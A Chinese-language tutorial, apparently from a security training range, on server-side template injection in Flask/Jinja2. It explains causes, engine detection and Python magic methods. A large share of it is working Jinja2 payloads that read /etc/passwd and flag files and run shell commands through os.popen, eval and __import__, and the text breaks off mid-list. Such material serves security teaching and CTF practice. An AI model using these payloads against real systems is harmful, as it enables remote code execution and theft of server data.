<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<link rel='stylesheet' href='../../../plugins/googleapis/fonts.css'>
<link rel="stylesheet" href="../../../dist/css/markdown.css">
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><ul><li><p><strong><span>什么是SSTI</span></strong></p><p><span>SSTI为服务端模板注入攻击，它主要是由于框架的不规范使用而导致的。主要为python的一些框架，如 jinja2 mako tornado django flask、PHP框架smarty twig thinkphp、java框架jade velocity spring等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</span></p></li></ul><p></br></p><ul><li><p><strong><span>漏洞成因</span></strong></p><p><span>服务端接收了攻击者的恶意输入以后，未经任何处理就将其作为Web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中(一般可以执行各种表达式)，执行了攻击者插入的可以破坏模板结构的语句(恶意Payload)，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。其影响范围主要取决于模版引擎的复杂性。</span></p></li></ul><p></br></p><ul><li><p><strong><span>SSTI前置知识之模板引擎</span></strong></p><p><span>主流的WEB服务开发时，主要分为以下两种技术：</span></p><ul><li><p><span>前后端不分离：即后端完成路由，用户在浏览器输入一个url，访问的是后端路由（服务端响应），后端接收请求后，再将数据通过</span><code>模板引擎</code><span>解析再渲染成视图返回给前端。后端路由，由后端渲染数据，再返回视图给前端，前端只负责展示视图，所有的交互都在后台。</span></p><p><span>可以简单理解为，访问一个URL后直接得到html页面。</span></p></li><li><p><span>前后端分离：前端使用JavaScript框架，如(jquery，vue，react，angular)，前端项目化；后端去掉所有的视图，只提供api接口，用户在浏览器访问的路由为前端路由（也称为Hash路由，由前端响应），只加载前端视图，数据只通过ajax获取，前端获取数据之后再渲染到视图，前端负责控制路由，展示视图，后端只负责提供api，用户和视图交互，视图上的按钮以及页面数据和后端api交互；</span></p><p><span>可以简单理解为，访问一个URL后返回的是JSON等数据，而不是一个完全渲染好的html页面。例如本靶场的架构就为前后端分离架构。</span></p></li></ul><p><span>所以模板引擎技术主要应用在前后端不分离的项目中，通过提前定义好模板，将数据填充进行渲染出HTML后，返回给浏览器。</span></p><p><span>通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。作为对比，一个很不好的解决方法是通过字符串拼接的方式来组成HTML文件，然后统一输出。</span></p></li></ul><p></br></p><ul><li><p><strong><span>SSTI漏洞测试</span></strong></p><ol><li><p><span>SSTI基本上只存在于前后端不分离项目，即接口直接返回渲染好的HTML页面。</span></p></li><li><p><span>存在SSTI漏洞的接口通常存在参数输入点，且参数在HTML页面中有回显点。</span></p></li><li><p><span>也有可能通过二次注入的方式，在不同接口中体现。</span></p></li><li><p><span>可以通过工具对模板引擎进行判断，也可以尝试特定Payload进行判断。</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>不同模板引擎判定</span></strong></p><p><span>可以根据下表对模板引擎进行判定：</span></p><p><img src="ssti-1.jpg" referrerpolicy="no-referrer"></p></li></ul><p></br></p><ul><li><p><strong><span>已知的一些模版和其是否存在问题</span></strong></p></li></ul><p><img src="ssti-sum.png" referrerpolicy="no-referrer"></p><p></br></p><ul><li><p><strong><span>SSTI之Flask-JinJa2模板引擎</span></strong></p><p><span>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的，是Flask框架的一部分。</span></p><ul><li><p><span>基础语法</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="jinja2" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="jinja2"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable"> ... </span><span class="cm-tag">}}</span>：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-variable"> ... </span><span class="cm-tag">%}</span>：装载一个控制语句。</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">{# ... #}</span>：装载一个注释，模板渲染的时候会忽视这中间的值</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-variable"> set name</span><span class="cm-operator">=</span><span class="cm-string">'xx'</span><span class="cm-variable"> </span><span class="cm-tag">%}</span>：在模板中添加变量</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># with语句来创建一个内部的作用域，将set语句放在其中，这样创建的变量只在with代码块中才有效</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-keyword"> with</span><span class="cm-variable"> gg </span><span class="cm-operator">=</span><span class="cm-number"> 42</span><span class="cm-variable"> </span><span class="cm-tag">%}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable"> gg </span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-keyword"> endwith</span><span class="cm-variable"> </span><span class="cm-tag">%}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># if语句</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-keyword"> if</span><span class="cm-number"> 1</span><span class="cm-operator">==</span><span class="cm-number">1</span><span class="cm-variable"> </span><span class="cm-tag">%}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-number"> 7*7</span><span class="cm-variable"> </span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-variable">else</span><span class="cm-tag">%}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-number"> 8*8</span><span class="cm-variable"> </span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-keyword"> endif</span><span class="cm-variable"> </span><span class="cm-tag">%}</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 392px;"></div><div class="CodeMirror-gutters" style="display: none; height: 392px;"></div></div></div></pre></li><li><p><span>Python魔术方法</span></p><p><span>Python魔术方法（Magic Methods）是一系列特殊命名的方法，其名称以双下划头和尾（例如</span><code>__init__</code><span>和</span><code>__new__</code><span>）的形式出现，这些方法在类的特定事件被触发时自动执行，无需显式调用。这些方法允许程序员自定义类的行为，以创建更具表现力和功能的类实例。</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">__class__  <span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span>返回示例所属的类</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">__mro__ &nbsp;  <span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span>返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">__base__ &nbsp; <span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span>返回一个类所继承的基类 &nbsp;  # __base__和__mro__都是用来寻找基类的</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">__subclasses__  每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用列表</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">__init__  <span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">    </span>类的初始化方法</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">__globals__  <span class="cm-tab" role="presentation" cm-text="	">   </span>对包含函数全局变量的字典的引用</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 138px;"></div><div class="CodeMirror-gutters" style="display: none; height: 138px;"></div></div></div></pre><p><span>通过这些魔术方法的组合构造，就可以最大限度的执行到各种危险方法，比如读文件、执行系统命令。关于魔术方法的更多了解可请参考</span><a href='https://blog.csdn.net/spiritx/article/details/132590256' target="_blank"><span>CSDN-Python魔术方法</span></a><span>和Python反序列化漏洞部分。</span></p></li></ul></li></ul><p></br></p><ul><li><p><strong><span>JinJa2模板常见测试Payload</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="jinja2" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="jinja2"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># 读文件</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">40</span><span class="cm-variable">](</span><span class="cm-string">'flag'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">40</span><span class="cm-variable">](</span><span class="cm-string">'etc/passwd'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">40</span><span class="cm-variable">](</span><span class="cm-string">'etc/passwd'</span><span class="cm-variable">).readlines()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">257</span><span class="cm-variable">](</span><span class="cm-string">'flag'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span> (python3)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#直接使用popen命令，python2是非法的，只限于python3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">os._wrap_close 类里有popen</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">128</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'popen'</span><span class="cm-variable">](</span><span class="cm-string">'whoami'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">128</span><span class="cm-variable">].__init__.__globals__.popen(</span><span class="cm-string">'whoami'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#调用os的popen执行命令</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#python2、python3通用</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">71</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'os'</span><span class="cm-variable">].popen(</span><span class="cm-string">'ls'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">71</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'os'</span><span class="cm-variable">].popen(</span><span class="cm-string">'ls /flag'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">71</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'os'</span><span class="cm-variable">].popen(</span><span class="cm-string">'cat /flag'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__base__.__subclasses__()[</span><span class="cm-number">185</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'__import__'</span><span class="cm-variable">](</span><span class="cm-string">'os'</span><span class="cm-variable">).popen(</span><span class="cm-string">'cat /flag'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">250</span><span class="cm-variable">].__init__.__globals__.__builtins__.__import__(</span><span class="cm-string">'os'</span><span class="cm-variable">).popen(</span><span class="cm-string">'id'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">250</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'__import__'</span><span class="cm-variable">](</span><span class="cm-string">'os'</span><span class="cm-variable">).popen(</span><span class="cm-string">'id'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">250</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'os'</span><span class="cm-variable">].popen(</span><span class="cm-string">'whoami'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#python3专属</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">75</span><span class="cm-variable">].__init__.__globals__.__import__(</span><span class="cm-string">'os'</span><span class="cm-variable">).popen(</span><span class="cm-string">'whoami'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__base__.__subclasses__()[</span><span class="cm-number">128</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'os'</span><span class="cm-variable">].popen(</span><span class="cm-string">'ls /'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#调用eval函数读取</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#python2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">59</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'eval'</span><span class="cm-variable">](</span><span class="cm-string">"__import__('os').popen('ls').read()"</span><span class="cm-variable">)</span><span class="cm-tag">}}</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__mro__[-1].__subclasses__()[</span><span class="cm-number">60</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'eval'</span><span class="cm-variable">](</span><span class="cm-string">'__import__("os").system("ls")'</span><span class="cm-variable">)</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__mro__[-1].__subclasses__()[</span><span class="cm-number">61</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'eval'</span><span class="cm-variable">](</span><span class="cm-string">'__import__("os").system("ls")'</span><span class="cm-variable">)</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__mro__[-1].__subclasses__()[</span><span class="cm-number">29</span><span class="cm-variable">].__call__(eval,</span><span class="cm-string">'os.system("ls")'</span><span class="cm-variable">)</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#python3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">().__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">75</span><span class="cm-variable">].__init__.__globals__.__builtins__[</span><span class="cm-string">'eval'</span><span class="cm-variable">](</span><span class="cm-string">"__import__('os').popen('id').read()"</span><span class="cm-variable">)</span><span class="cm-tag">}}</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__mro__[</span><span class="cm-number">2</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">59</span><span class="cm-variable">].__init__.func_globals.values()[</span><span class="cm-number">13</span><span class="cm-variable">][</span><span class="cm-string">'eval'</span><span class="cm-variable">]</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__mro__[-1].__subclasses__()[</span><span class="cm-number">117</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'eval'</span><span class="cm-variable">]</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">250</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'eval'</span><span class="cm-variable">](</span><span class="cm-string">"__import__('os').popen('id').read()"</span><span class="cm-variable">)</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">250</span><span class="cm-variable">].__init__.__globals__.__builtins__.eval(</span><span class="cm-string">"__import__('os').popen('id').read()"</span><span class="cm-variable">)</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__base__.__subclasses__()[</span><span class="cm-number">128</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'eval'</span><span class="cm-variable">](</span><span class="cm-string">'__import__("os").popen("ls /").read()'</span><span class="cm-variable">)</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#调用 importlib类</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__base__.__subclasses__()[</span><span class="cm-number">128</span><span class="cm-variable">][</span><span class="cm-string">"load_module"</span><span class="cm-variable">](</span><span class="cm-string">"os"</span><span class="cm-variable">)[</span><span class="cm-string">"popen"</span><span class="cm-variable">](</span><span class="cm-string">"ls /"</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#调用linecache函数</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__base__.__subclasses__()[</span><span class="cm-number">128</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'linecache'</span><span class="cm-variable">][</span><span class="cm-string">'os'</span><span class="cm-variable">].popen(</span><span class="cm-string">'ls /'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">59</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'linecache'</span><span class="cm-variable">][</span><span class="cm-string">'os'</span><span class="cm-variable">].popen(</span><span class="cm-string">'ls'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">[].__class__.__base__.__subclasses__()[</span><span class="cm-number">168</span><span class="cm-variable">].__init__.__globals__.linecache.os.popen(</span><span class="cm-string">'ls /'</span><span class="cm-variable">).read()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
